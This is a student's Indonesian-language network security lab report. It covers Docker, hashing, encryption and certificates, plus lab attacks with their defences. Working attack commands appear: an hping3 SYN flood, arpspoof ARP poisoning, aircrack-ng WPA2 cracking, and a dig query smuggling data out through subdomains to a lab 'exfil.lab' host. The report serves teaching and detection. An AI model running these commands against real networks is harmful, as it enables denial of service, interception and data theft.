# JAWABAN UTS Network Security

**NIM:** 24552011306
**Kasus:** 9

## Perhitungan Kasus
- Digit NIM: [2, 4, 5, 5, 2, 0, 1, 1, 3, 0, 6]
- Jumlah: [29]
- Sisa bagi 10: [9]
- Kasus: [9]

## BAGIAN A

## A1. Container dasar dan port mapping
Jalankan kontainer Nginx di latar belakang, petakan port 8080 host ke port 80 kontainer, verifikasi statusnya, lakukan pengujian akses HTTP, dan baca bagian awal konfigurasinya.
  ```
  docker run -d --name web-uts -p 8080:80 nginx:alpine
  docker ps
  curl http://localhost:8080
  docker exec web-uts head -n 5 /etc/nginx/nginx.conf
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="A1" src="https://github.com/user-attachments/assets/e167dc56-d8af-49c0-8520-0c0a05885e03" />
Penjelasan:
  - Perintah docker run -d -p 8080:80 mengunduh dan menjalankan image nginx:alpine di latar belakang (-d) sambil membuka akses port 8080 pada            komputer host menuju port 80 di dalam kontainer.
  - docker ps menampilkan daftar kontainer yang sedang berjalan.
  - curl menguji apakah server web Nginx merespons permintaan halaman utama, dan perintah docker exec membaca 5 baris pertama file konfigurasi utama     Nginx (nginx.conf) di dalam kontainer.

## A2. Persistensi Volume
Membuat volume Docker mandiri agar data tetap aman dan persisten meskipun kontainer dihapus.
  ```
  docker volume create data-uts
  docker run --name w1 -v data-uts:/data alpine sh -c 'echo 24552011306 > /data/catatan.txt'
  docker rm w1
  docker run --rm -v data-uts:/data alpine cat /data/catatan.txt
  ```
Hasil Praktikum :
<img width="2880" height="570" alt="A2" src="https://github.com/user-attachments/assets/75df40b7-99c2-4575-82cb-1e3fcb4d4b1b" />
Penjelasan :
  - docker volume create data-uts: Membuat penyimpanan data terisolasi di luar siklus hidup kontainer.
  - Kontainer w1 menuliskan NIM (24552011306) ke dalam file /data/catatan.txt.
  - Meskipun kontainer w1 dihapus (docker rm w1), data tetap aman di dalam volume dan dapat dibaca kembali oleh kontainer baru.

## A3. Integritas File dengan Hash
Menguji sensitivitas fungsi kriptografi hash (MD5 dan SHA-256) terhadap perubahan data sekecil apa pun.
  ```
  echo 'pesan rahasia' > pesan.txt
  md5sum pesan.txt
  sha256sum pesan.txt
  sed -i 's/pesan/pesaN/' pesan.txt
  md5sum pesan.txt
  sha256sum pesan.txt
  ```
Hasil Praktikum :
<img width="2880" height="586" alt="A3" src="https://github.com/user-attachments/assets/6d089ba0-3870-4950-aa3d-d105ffe85d31" />
Penjelasan :
  - Nilai checksum dihitung sebelum dan sesudah isi file diubah menggunakan sed.
  - Perubahan satu huruf saja menyebabkan nilai hash (MD5 maupun SHA-256) berubah secara total (avalanche effect), membuktikan keandalan fungsi hash     dalam menjaga integritas data.

## A4. Enkripsi Simetris dengan OpenSSL
Mengamankan file teks menggunakan algoritma enkripsi simetris AES-256-CBC, serta menguji dekripsi dengan sandi benar dan salah.
  ```
  openssl enc -aes-256-cbc -pbkdf2 -salt -in pesan.txt -out pesan.enc -pass pass:kunci123
  openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:kunci123
  openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:salah
  openssl enc -aes-256-cbc -pbkdf2 -salt -a -in pesan.txt -pass pass:kunci123
  ```
Hasil Praktikum :
<img width="2880" height="538" alt="A4" src="https://github.com/user-attachments/assets/027cc0df-52c3-43fd-8abf-530422bf3aa5" />
Penjelasan :
  - Enkripsi dilakukan menggunakan AES-256-CBC dengan proteksi PBKDF2 dan kunci sandi kunci123.
  - Dekripsi dengan password benar berhasil memulihkan teks asli, sedangkan password salah memunculkan error bad decrypt. Parameter -a digunakan         untuk format keluaran Base64.

## A5. Jaringan Bridge dan Akses Antar-Kontainer
Membangun jaringan bridge kustom agar beberapa kontainer dapat saling berkomunikasi secara internal.
  ```
  docker network create lab-net
  docker run -d --name host-a --network lab-net alpine sleep infinity
  docker run -d --name host-b --network lab-net alpine sleep infinity
  docker run -d --name dvwa --network lab-net vulnerables/web-dvwa
  docker exec host-a ping -c 3 host-b
  docker exec host-a wget -S -O /dev/null http://dvwa/login.php
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="A5" src="https://github.com/user-attachments/assets/5b3dfeff-bc46-410e-9005-094a53e0571e" />
Penjelasan :
  - Jaringan kustom lab-net memungkinkan resolusi nama host antar-kontainer secara otomatis.
  - Uji coba ping dan wget membuktikan konektivitas jaringan lapisan 3 serta akses HTTP internal antar-kontainer berjalan dengan sukses.


## BAGIAN B

## B1. Docker Compose Multi-Container Terisolasi
Membuat dan menjalankan arsitektur multi-container menggunakan Docker Compose pada jaringan internal terisolasi (`internal: true`) tanpa membuka *port* publik ke host.
  ```
  cd b/b1-compose
  docker compose up -d
  docker compose exec attacker wget -qO- http://target
  docker compose down -v
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="B1" src="https://github.com/user-attachments/assets/7d0fff41-d04a-4bae-bd4c-0b6c50f64f4e" />
Penjelasan :
  - Perintah dijalankan:
Layanan target (Nginx) dan attacker (Alpine) dijalankan di dalam jaringan virtual lab dengan parameter internal: true.Kontainer attacker berhasil mengakses halaman web target secara internal menggunakan utilitas wget.
  - Mengapa curl http://localhost dari host tidak bisa mencapai target?
Karena jaringan Docker dikonfigurasi dengan opsi internal: true yang memutus akses internet dan komunikasi eksternal dari luar jaringan virtual tersebut. Selain itu, service target tidak memiliki pemetaan port (ports) ke mesin host, sehingga komputer host tidak memiliki jalur masuk (route) atau port binding untuk meneruskan permintaan HTTP dari luar kontainer.

## B2. Kriptografi RSA dan Sertifikat
Melakukan pembangkitan kunci asimetris RSA, penandatanganan digital (digital signature), verifikasi integritas pesan, serta pembuatan dan pemeriksaan sertifikat X.509 (self-signed).
  ```
  docker run --rm -it -v "$PWD":/work uts-openssl sh

  # Di dalam kontainer:
  openssl genrsa -out priv.pem 2048
  openssl rsa -in priv.pem -pubout -out pub.pem
  echo 'pesan untuk ditandatangani' > pesan.txt
  openssl dgst -sha256 -sign priv.pem -out sig.bin pesan.txt
  openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
  echo 'diubah' >> pesan.txt
  openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
  openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30 -subj /CN=lab.uts.local
  openssl x509 -in cert.pem -noout -subject -issuer -dates
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="B2" src="https://github.com/user-attachments/assets/aa009331-9ef0-4af7-ab06-a4e745871527" />
Penjelasan :
  - Hasil Eksekusi:
Proses verifikasi pertama menghasilkan Verified OK saat file asli divalidasi dengan kunci publik. Setelah isi file diubah, verifikasi menghasilkan Verification Failure, yang membuktikan bahwa tanda tangan digital melindungi integritas data dari manipulasi.
  - Perbedaan Sertifikat Self-Signed dan CA:
Sertifikat self-signed ditandatangani oleh pembuatnya sendiri tanpa divalidasi oleh otoritas terpercaya, sehingga sering memicu peringatan keamanan pada sistem atau peramban web. Sebaliknya, sertifikat yang ditandatangani oleh Certificate Authority (CA) tepercaya divalidasi oleh pihak ketiga yang independen, sehingga otomatis diakui keaslian dan kepercayaannya oleh sistem secara global.   

## B3. SYN Flood dan Deteksinya
Mensimulasikan serangan Denial of Service (DoS) berjenis SYN Flood menggunakan alat uji hping3 serta mengamati lonjakan antrean koneksi setengah terbuka (SYN_RECV) pada server target.
  ```
  cd b/b3-syn-flood
  docker compose up -d
  docker compose exec target netstat -ant | grep -c SYN_RECV
  docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
  docker compose exec target netstat -ant | grep -c SYN_RECV
  docker compose exec target sysctl -w net.ipv4.tcp_syncookies=1
  docker compose down -v
  ```
Hasil Praktikum
<img width="2880" height="940" alt="B3" src="https://github.com/user-attachments/assets/e031c976-1bef-42a7-b933-a03668bf5081" />
Penjelasan :
  - Jumlah SYN_RECV sebelum serangan:
    Bernilai 0 (kondisi normal tanpa koneksi tertunda).
  - Menjalankan serangan:
    Pengiriman paket SYN secara membabi-buta (flooding) dilakukan dari kontainer attacker ke port 80 target selama 15 detik.
  - Jumlah SYN_RECV saat serangan: Melonjak naik (misalnya menjadi 1 atau lebih tinggi pada antrean terbatas lab) yang menunjukkan sumber daya           memori server mulai terbebani oleh handshake palsu.
  - Mitigasi (SYN Cookies):
    Fitur SYN cookies mengizinkan server merespons permintaan SYN tanpa mengalokasikan memori backlog di awal; server baru       mengalokasikan          sumber daya setelah menerima paket ACK yang sah, sehingga memblokir potensi kelumpuhan memori akibat SYN flood.   
  
  ## B4. DNS Exfiltration Lewat Subdomain
  Menyelundupkan data rahasia (NIM mahasiswa) ke luar jaringan melalui label subdomain pada kueri protokol DNS standar.  
  ```
  cd b/b4-dns-exfil
  docker compose up -d
  echo -n '24552011306' | xxd -p
  docker compose exec attacker dig +short 3234353532303131333036.exfil.lab @dns
  docker compose logs dns | grep exfil.lab
  echo '3234353532303131333036' | xxd -r -p
  docker compose down -v
  ```
Hasil Praktikum 
<img width="2860" height="994" alt="B4" src="https://github.com/user-attachments/assets/688076b7-64e0-4d64-b744-9abdebe0a1b5" />
Penjelasan :
  - Hasil Eksekusi:
NIM 24552011306 dikonversi ke format heksadesimal (3234353532303131333036), disisipkan ke kueri DNS, berhasil terekam di log server DNS, dan didekode kembali menjadi teks asli dengan sukses.
  - Mengapa teknik ini sulit diblokir firewall biasa?
Karena protokol DNS (menggunakan port UDP 53) merupakan layanan fundamental yang mutlak diizinkan keluar-masuk jaringan korporat atau publik untuk aktivitas internet sehari-hari, sehingga firewall konvensional jarang mencurigai kueri DNS yang membawa muatan tersembunyi.
  - Indikator Deteksi:
Adanya lonjakan frekuensi permintaan kueri DNS berulang dengan panjang label subdomain yang tidak normal, acak, atau memiliki tingkat entropi tinggi menuju domain eksternal yang sama. 


# Tugas 1 (Pertemuan 1): Docker dan Volume
```
  docker volume create vol-k9
  docker run --name w-k9 -v vol-k9:/data alpine sh -c 'echo 24552011306 > /data/laporan-k9.txt'
  docker rm w-k9
  docker run --rm -v vol-k9:/data alpine cat /data/laporan-k9.txt
  docker compose -p k9 -f b/b1-compose/docker-compose.yml up -d
  docker compose -p k9 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
  docker compose -p k9 -f b/b1-compose/docker-compose.yml down -v
```
Hasil Praktikum
<img width="2878" height="1796" alt="TUGAS 1" src="https://github.com/user-attachments/assets/fa462f41-1e85-4492-951e-edd9e5a2d061" />
Penjelasan :
  - docker volume create vol-k9 membuat volume penyimpanan persisten di luar siklus hidup container.
  - Container w-k9 menulis NIM 24552011306 ke /data/laporan-k9.txt pada volume vol-k9, lalu dihapus dengan docker rm w-k9. Data tetap utuh dan           terbaca kembali oleh container baru alpine yang me-mount volume yang sama.
  - docker compose -p k9 -f b/b1-compose/docker-compose.yml up -d menjalankan jaringan k9_lab beserta layanan k9-target-1 dan k9-attacker-1 di latar belakang.
  - docker compose ... exec attacker wget -qO- http://target membuktikan konektivitas dan akses HTTP internal dari attacker ke layanan target (Nginx) di dalam jaringan lab, lalu down -v membersihkan container, jaringan, dan volume proyek k9.   

# Tugas 2 (Pertemuan 2): Kriptografi
```
  docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k9 > laporan-k9.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 && sha256sum laporan-k9.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 && sha256sum hasil-k9.txt'
  docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem -days 30 -subj /CN=k9.uts.local && openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
```
Hasil Praktikum
<img width="2880" height="908" alt="TUGAS 2" src="https://github.com/user-attachments/assets/5264864f-b296-419c-8959-36f53a8bbed4" />
Penjelasan :
  - Perintah pertama membuat laporan-k9.txt, mengenkripsinya menjadi laporan-k9.enc memakai algoritma aes-256-cbc dengan derivasi kunci pbkdf2 dan salt menggunakan sandi kunci-k9-2026, lalu mendekripsinya kembali menjadi hasil-k9.txt.
  - Kesamaan nilai hash SHA-256 antara laporan-k9.txt dan hasil-k9.txt membuktikan proses enkripsi-dekripsi berjalan tanpa merusak integritas isi file.
  - Perintah kedua membangkitkan kunci privat RSA 2048-bit (key-k9.pem) dan sertifikat self-signed X.509 (cert-k9.pem) selama 30 hari untuk CN=k9.uts.local, sehingga nilai subject dan issuer sama karena sertifikat ditandatangani sendiri.

# Tugas 3 (Pertemuan 3): ARP Spoofing
```
  docker network create lab-arp-k9
  docker run -d --name korban-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
  docker run -d --name gateway-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
  docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
  docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{"\n"}}{{end}}' korban-k9 gateway-k9
  
  IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
  IP_GATEWAY=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
  MAC_GATEWAY=$(docker exec gateway-k9 cat /sys/class/net/eth0/address)
  MAC_PENYERANG=$(docker exec penyerang-k9 cat /sys/class/net/eth0/address)
  
  docker exec korban-k9 python3 -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'init', ('$IP_GATEWAY', 9999))"
  sleep 1
  docker exec korban-k9 cat /proc/net/arp
  
  docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GATEWAY"
  sleep 4
  docker exec korban-k9 cat /proc/net/arp
  
  docker exec korban-k9 python3 -c '
  import socket, struct, sys
  ip_gw, mac_gw = sys.argv[1], sys.argv[2]
  ifidx = int(open("/sys/class/net/eth0/ifindex").read().strip())
  s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
  s.bind((0, 0))
  ndmsg = struct.pack("=BBHiHBB", socket.AF_INET, 0, 0, ifidx, 0x80, 0, 1)
  rta_dst = struct.pack("=HH4s", 8, 1, socket.inet_aton(ip_gw))
  rta_ll  = struct.pack("=HH6s2x", 10, 2, bytes.fromhex(mac_gw.replace(":", "")))
  payload = ndmsg + rta_dst + rta_ll
  nlhdr = struct.pack("=IHHII", 16 + len(payload), 28, 0x105, 1, 0)
  s.send(nlhdr + payload)
  ' "$IP_GATEWAY" "$MAC_GATEWAY"
  
  docker exec korban-k9 cat /proc/net/arp
```
Hasil Praktikum 
<img width="2872" height="626" alt="TUGAS 3 1" src="https://github.com/user-attachments/assets/78389c81-a6d3-429a-929d-dcdeb4f202c2" />
<img width="2880" height="826" alt="3 2" src="https://github.com/user-attachments/assets/9542df19-5c97-432a-a240-6db4ff7be88a" />
<img width="2880" height="946" alt="3 3" src="https://github.com/user-attachments/assets/8398050f-80e3-4edc-9692-3e47e410baec" />
Penjelasan :
  - Jaringan lab-arp-k9 dibuat dan tiga container (korban-k9, gateway-k9, penyerang-k9) dijalankan dengan kapabilitas NET_ADMIN agar diizinkan memanipulasi antarmuka dan tabel jaringan.
  - Karena utilitas arp dan ip tidak tersedia di dalam container, pengecekan tabel ARP dilakukan melalui /proc/net/arp dan pengiriman paket UDP awal memicu pengisian cache ARP.
  - arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GATEWAY" dijalankan selama 20 detik untuk melakukan ARP poisoning di jaringan lokal.
  - Skrip Python menggunakan socket AF_NETLINK (NETLINK_ROUTE) digunakan untuk memasang entri ARP permanen (flag 0x6) pada korban-k9 sehingga pemetaan IP-ke-MAC yang sah tidak mudah ditimpa oleh balasan ARP palsu.   

# Tugas 4 (Pertemuan 4): Analisis Handshake WPA2
```
  curl -O [https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/test/capture_wds-01.cap](https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/test/capture_wds-01.cap)
  curl -O [https://raw.githubusercontent.com/yastiaisyah/Network-Security-Course-Bank/main/UTS-Network-Security/01-sumber-lab/samples/wordlist-k9.txt](https://raw.githubusercontent.com/yastiaisyah/Network-Security-Course-Bank/main/UTS-Network-Security/01-sumber-lab/samples/wordlist-k9.txt)
  docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w /work/wordlist-k9.txt /work/capture_wds-01.cap
  docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w /work/wordlist-k9.txt -b 00:11:22:00:00:00 /work/capture_wds-01.cap
```
Hasil Praktikum
<img width="1919" height="1079" alt="TUGAS 4 1" src="https://github.com/user-attachments/assets/118cc47f-9020-4ebc-a7f1-4e461e307857" />
<img width="1919" height="608" alt="TUGAS 4 2" src="https://github.com/user-attachments/assets/1b116f76-e8e4-43cb-85ce-ab21d03daa8f" />
Penjelasan :
  - Berkas sampel capture (capture_wds-01.cap) dan wordlist (wordlist-k9.txt) diunduh ke direktori kerja lalu diproses menggunakan aircrack-ng di dalam kontainer uts-kali-tools.
  - Penambahan parameter -b 00:11:22:00:00:00 mengarahkan pengujian langsung ke BSSID target test1 sehingga proses pengujian wordlist berjalan non-interaktif hingga selesai dan menampilkan status KEY NOT FOUND.

## Empat Langkah Handshake WPA2 (4-Way Handshake)
  - Pesan 1 (AP ke Client): Access Point (AP) mengirimkan ANonce (bilangan acak dari AP) kepada Client. Client kemudian menggabungkan ANonce dengan SNonce (yang dibuat Client), Pairwise Master Key (PMK), serta alamat MAC AP dan Client untuk menurunkan Pairwise Transient Key (PTK).
  - Pesan 2 (Client ke AP): Client mengirimkan SNonce dan Message Integrity Code (MIC) yang dihitung menggunakan kunci KCK (bagian dari PTK) ke AP untuk membuktikan kepemilikan PMK dan mengonfirmasi kesiapan kunci.
  - Pesan 3 (AP ke Client): AP memverifikasi MIC dari Client, lalu mengirimkan Group Temporal Key (GTK) terenkripsi beserta MIC baru untuk mengonfirmasi pemasangan kunci sesi.
  - Pesan 4 (Client ke AP): Client mengirimkan paket konfirmasi terakhir (ACK) kepada AP untuk menandakan bahwa PTK dan GTK telah terpasang dan komunikasi data terenkripsi siap digunakan.

# Tugas 5 (Pertemuan 5): ICMP dengan Scapy
```
  docker run --rm --network lab-arp-k9 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.22.0.2
```
Hasil Praktikum 
<img width="2880" height="200" alt="TUGAS 5" src="https://github.com/user-attachments/assets/7c5ffab3-1943-4016-b5d7-f59a887495d6" />
Penjelasan :
  - Perintah menjalankan skrip Python kirim_icmp.py menggunakan Scapy di dalam kontainer uts-kali-tools yang terhubung ke jaringan lab-arp-k9, dengan direktori kasus/k5-scapy di-mount ke /work.
  - Paket ICMP Echo Request dikirim dari IP 172.22.0.5 menuju target 172.22.0.2 dan menerima balasan berupa Tipe ICMP 0 (Echo Reply) dengan TTL 64

## Penjelasan Smurf Attack
  - Pengertian: Smurf Attack adalah jenis serangan Distributed Denial of Service (DDoS) berbasis protokol ICMP yang memanfaatkan jaringan perantara sebagai penguat (amplifier) untuk membanjiri target dengan trafik balasan.

  - Cara Kerja: Penyerang mengirimkan paket ICMP Echo Request ke alamat broadcast suatu jaringan perantara dengan memalsukan (spoofing) alamat IP sumber menjadi alamat IP korban. Seluruh host aktif di jaringan perantara yang menerima broadcast tersebut akan membalas dengan ICMP Echo Reply langsung ke IP korban, sehingga membebani bandwidth dan sumber daya sistem korban.   
image_7c320c.png

# Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake
```
  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml up -d
  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
  docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml down -v
```
Hasil Praktikum
<img width="2880" height="1242" alt="TUGAS 6" src="https://github.com/user-attachments/assets/4d790888-4d55-4ad4-98e5-26c52d36b273" />
Penjelasan :
  - Lingkungan k9_lab dijalankan dengan layanan k9-target-1 dan k9-attacker-1 menggunakan Docker Compose.
  - Sebelum serangan hping3 dijalankan, jumlah koneksi pada status SYN_RECV di target adalah 0, lalu meningkat menjadi 1 saat serangan banjir paket SYN berlangsung.
  - Capture tcpdump pada port 80 (172.23.0.2:80) menangkap alur TCP three-way handshake antara klien 172.23.0.3:53412 dan server target: diawali paket SYN (Flags [S]), dibalas SYN-ACK (Flags [S.]), lalu dilengkapi ACK (Flags [.]) sebelum pertukaran data HTTP (GET / HTTP/1.1 dan 200 OK) serta penutupan koneksi (FIN).

# Tugas 7 (Pertemuan 7): DNS Exfiltration
```
  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml up -d
  echo -n '24552011306' | xxd -p
  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131333036.k9.exfil.lab @dns
  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
  python3 kasus/k9-dns-detect/analisis_dns.py dns-k9.log
  echo '3234353532303131333036' | xxd -r -p
  docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml down -v 
```
Hasil Praktikum
<img width="2880" height="814" alt="TUGAS 7" src="https://github.com/user-attachments/assets/abe781f4-1d8b-4db5-9817-93d4eb94c1de" />
Penjelasan :
  - Perintah echo -n '24552011306' | xxd -p mengubah NIM menjadi representasi heksadesimal 3234353532303131333036 yang disisipkan sebagai subdomain pada kueri dig ke k9.exfil.lab melalui server @dns.
  - Log dari layanan dns disimpan ke dns-k9.log dan dianalisis menggunakan analisis_dns.py, yang mengidentifikasi pola label subdomain heksadesimal panjang sebagai aktivitas eksfiltrasi data mencurigakan.
  - Perintah echo '3234353532303131333036' | xxd -r -p mengembalikan string hex ke bentuk teks aslinya (24552011306), sebelum akhirnya lingkungan lab dibersihkan dengan docker compose ... down -v.

## KESIMPULAN
  Seluruh rangkaian praktikum dan pengujian UTS Network Security (mulai dari dasar kontainerisasi Docker, volume persisten, jaringan bridge terisolasi, kriptografi simetris AES-256 dan asimetris RSA/sertifikat X.509, hingga analisis serangan dan pertahanan jaringan seperti ARP spoofing, analisis handshake WPA2, ICMP dengan Scapy, SYN flood, dan DNS exfiltration) telah berhasil dijalankan dan didokumentasikan dengan baik.   
  - Infrastruktur & Isolasi Jaringan: Penggunaan volume Docker menjaga persistensi data meskipun kontainer dihapus, sementara jaringan kustom dan internal network pada Docker Compose membatasi eksposur layanan ke luar sekaligus tetap memungkinkan komunikasi internal antar-layanan.
  - Kriptografi & Integritas Data: Fungsi hash (MD5/SHA-256) dan tanda tangan digital RSA sensitif terhadap perubahan data sekecil apa pun, sedangkan enkripsi AES-256 serta sertifikat X.509 mendukung kerahasiaan dan autentikasi identitas.
  - Serangan, Deteksi, & Mitigasi: Pengujian ARP spoofing, SYN flood, WPA2 handshake, dan DNS exfiltration menunjukkan bagaimana celah protokol lapisan data, transport, dan aplikasi dapat dimanfaatkan, sekaligus menegaskan pentingnya mitigasi seperti entri ARP statis/permanen, SYN cookies, serta pemantauan anomali trafik
